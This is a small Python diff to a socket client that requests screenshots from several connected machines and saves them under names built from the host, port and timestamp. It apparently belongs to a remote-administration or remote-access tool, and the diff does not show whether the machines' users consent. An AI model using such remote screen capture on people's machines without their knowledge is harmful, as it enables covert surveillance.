@@ -26,9 +26,9 @@ class Client:
             output=self.servers[server_index].recv(30_0024)
         return output.decode() if to_text else output
     
-    def get_image_from_server(self,server_index):
+    def get_image_from_server(self,server_index,hots,port):
         self.servers[server_index].send(b'screen')
-        screen_file = open(f"{datetime.now().strftime('%Y-%m-%d %H_%M_%S')}_{server_index}.png",'wb')
+        screen_file = open(f"screen_shots/{datetime.now().strftime('%Y-%m-%d - %H_%M_%S')}_{hots}_{port}.png",'wb')
         while True:
             image_chunk = self.servers[server_index].recv(2048)
             if b'screen_done' in image_chunk:
